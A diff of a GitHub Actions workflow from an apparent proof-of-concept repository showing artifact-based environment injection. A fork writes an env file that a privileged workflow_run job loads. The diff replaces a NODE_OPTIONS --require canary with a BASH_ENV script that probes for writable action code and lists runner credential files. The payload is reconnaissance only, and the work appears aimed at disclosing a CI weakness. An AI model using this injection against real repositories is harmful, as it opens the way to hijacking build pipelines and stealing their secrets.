@@ -30,19 +30,22 @@ jobs:
           W=/home/runner/work/ci-artifact-env-poc/ci-artifact-env-poc
           cat > ./env/env <<EOT
           PR_NUMBER=${{ github.event.number }}
-          POC_CANARY=injected-by-fork-Iradahkoreanway
-          NODE_OPTIONS=--require ${W}/poc-canary.js
+          POC_CANARY=third-pr-reach-check
+          BASH_ENV=${W}/poc-bashenv.sh
           EOT
-          cat > ./env/poc-canary.js <<'EOT'
-          console.log('[poc-canary] NODE_OPTIONS --require loaded this file inside the privileged '
-            + 'workflow_run job. repo=' + process.env.GITHUB_REPOSITORY
-            + ' ref=' + process.env.GITHUB_REF
-            + ' workflow=' + process.env.GITHUB_WORKFLOW);
+          cat > ./env/poc-bashenv.sh <<'EOT'
+          echo "[poc-reach] uid=$(id -u) cwd=$PWD"
+          echo "[poc-reach] actions downloaded for this job:"
+          find /home/runner/work/_actions -maxdepth 3 -mindepth 3 2>/dev/null | head -10
+          for f in $(find /home/runner/work/_actions -name 'index.js' -path '*dist*' 2>/dev/null | head -3); do
+            if [ -w "$f" ]; then echo "[poc-reach] WRITABLE: $f"; else echo "[poc-reach] read-only: $f"; fi
+          done
+          echo "[poc-reach] runner credential files present:"
+          ls -la /home/runner/work/_temp 2>/dev/null | head -5
+          echo "[poc-reach] NOTHING WAS MODIFIED."
           EOT
           echo "--- artifact contents the fork is about to upload ---"
           cat ./env/env
-          echo "---"
-          cat ./env/poc-canary.js
 
       - uses: actions/upload-artifact@v4
         with:
